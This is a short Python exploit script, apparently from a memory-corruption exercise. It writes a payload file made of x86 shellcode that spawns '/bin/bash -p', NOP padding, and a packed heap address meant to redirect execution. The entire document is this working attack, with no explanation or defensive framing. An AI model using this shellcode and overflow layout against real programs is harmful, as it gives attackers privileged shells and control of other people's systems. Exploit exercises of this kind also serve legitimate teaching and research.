import struct

heap_addr = 0x0804a008
shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
payload = shellcode
payload += b"\x90" * (0x50 - len(shellcode))
payload += struct.pack("<I", heap_addr)

with open("payload", "wb") as f:
    f.write(payload)